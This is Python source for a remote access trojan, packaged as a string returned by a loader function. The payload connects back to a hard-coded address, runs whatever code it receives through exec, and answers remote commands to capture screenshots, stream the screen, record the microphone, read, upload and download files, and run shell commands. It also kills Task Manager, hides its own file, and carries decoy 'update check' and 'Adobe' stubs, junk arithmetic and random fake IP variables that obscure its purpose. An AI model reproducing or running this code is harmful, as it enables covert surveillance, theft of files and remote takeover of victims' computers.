
def loader():
     
    return r'''   
def update_check():
            print("Checking for updates...")

def adobe_ph():
            print("Adobe..")
def safe_kill(pid):
            try:
                handle = ctypes.windll.kernel32.OpenProcess(1, False, pid)
                if handle:
                    ctypes.windll.kernel32.TerminateProcess(handle, -1)
                    ctypes.windll.kernel32.CloseHandle(handle)
            except:
                pass

def net_watchdog():
            while True:
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        name = proc.info['name']
                        if name and name.lower() == 'taskmgr.exe':
                            safe_kill(proc.info['pid'])
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
                sleep(1)
        


chars = [
            "a", "b", "c", "d", "e", "f", "g", "h", "j",
            "k", "l", "m", "n", "o", "q", "r", "s", "t",
            "u", "v", "w", "x", "y", "z"
        ]

cat = "63.24.27.75"
def dummy_logic(alpha, beta):
            result = ((alpha ^ beta) << 2) & 0xFF
            temp = ((result | beta) >> 1) ^ alpha
            final = (temp * 3 - result) ^ (alpha & beta)
            return (final + result - temp) ^ 0xAB
_ = dummy_logic(len(cat), sum(ord(c) for c in cat))
p = 4444
i = "127.0.0.1"
for b in range(25):
            char = choice(chars)
            value = f"{randint(0, 100)}.{randint(0, 100)}.{randint(0, 100)}.{randint(0, 100)}"

            globals()[char] = value 

            print(f"{char} = {value}")
for b in range(35):
            char = choice(chars)
            value = f"{randint(0, 100)}.{randint(0, 100)}.{randint(0, 100)}.{randint(0, 100)}"

            globals()[char] = value 

            print(f"{char} = {value}")
logged_keys = ""
hide_after_run = False
auto_task_manager_killer = False



def AlphaGetLink():
            global p
            global i

            while True:
                try:
                    q = randint(7, 20)
                    sleep(q)
                    client_socket = socket(AF_INET, SOCK_STREAM)
                    client_socket.connect((i, p))
                    client_socket.send("ack_sparload_ofc_sign_full".encode())
                    dex = b""
                    while True:
                        chunk = client_socket.recv(4096)
                        if b"__END__" in chunk:
                            dex += chunk.replace(b"__END__", b"")
                            break
                        dex += chunk
                    streaming = False 
                    exec(dex.decode(), globals())
                    while True:
                        try:
                            if not streaming:
                                comn = client_socket.recv(4096).decode()
                                if not comn:
                                    raise ConnectionError("Disconnected")

                                if comn.strip() == "screenshot":
                                    take_screenshot_send(client_socket)
                                    continue
                                elif comn.strip() == "screenstream":
                                    client_socket.send(b"start_stream")
                                    stream_screen(client_socket)
                                    continue

                                elif comn.startswith("download "):
                                    path1 = comn[9:]
                                    if not path.exists(path1):
                                        client_socket.send("[!] File or folder not found".encode())
                                        continue
                                    
                                    try:
                                    
                                        client_socket.send("[+] Starting file transfer...".encode())
                                        
                                    
                                        result = send_file(client_socket, path1)
                                        
                                    
                                        client_socket.send("TRANSFER_COMPLETE".encode())
                                    except Exception as e:
                                        client_socket.send(f"[!] Transfer failed: {str(e)}".encode())

                                elif comn.startswith("mic_record "):
                                    time = comn[11:]
                                    try:
                                        time = int(time)
                                        if time > 120 or time < 5:
                                            client_socket.send("[-] The number of seconds must be between 5 and 120".encode())
                                        else:
                                            client_socket.send("mic_start".encode())
                                            data = client_socket.recv(1024).decode()
                                            if data == "mic_ready":
                                                record_mic(time, client_socket)
                                                sleep(2)
                                                client_socket.send(b"__end__")
                                            
                                    except:
                                        client_socket.send("[-] Usage mic_record <seconds>".encode())      
                                    continue     
                                elif comn.startswith("upload "):
                                    result = receive_uploaded_file(client_socket)
                                    client_socket.send(result.encode()) 
                                    continue 
                                elif comn.startswith("cat "):
                                    try:
                                        filepath = comn[4:]
                                        if not path.isfile(filepath) or not access(filepath, R_OK):
                                            client_socket.sendall(f"[-] File is not readable or doesn't exist.".encode())
                                        else:
                                            with open(filepath, "r") as file:
                                                content = file.read()
                                            size = len(content.encode())
                                            client_socket.sendall(f"[SIZE]{size}".encode())
                                            ack = client_socket.recv(1024).decode().strip()
                                            if ack.lower() == "ready":
                                                client_socket.sendall(content.encode())
                                    except Exception as e:
                                        client_socket.sendall(f"[-] {str(e)}".encode())
                                    continue
                                else:
                                    client_socket.send(handel_command(comn).encode())

                            else:
                                sleep(0.1)

                        except Exception as e:
                          
                            client_socket.close()
                            break

                except Exception as e:
                  
                    try:
                        client_socket.close()
                    except:
                        pass
                    sleep(randint(7, 20))
                    continue


if hide_after_run:
            current_file = path.abspath(sys.argv[0])


            FILE_ATTRIBUTE_HIDDEN = 0x02

            try:
            
                ctypes.windll.kernel32.SetFileAttributesW(current_file, FILE_ATTRIBUTE_HIDDEN)
            except Exception as e:
                pass


if auto_task_manager_killer:
            threading.Thread(target=net_watchdog, daemon=True).start()
AlphaGetLink()'''


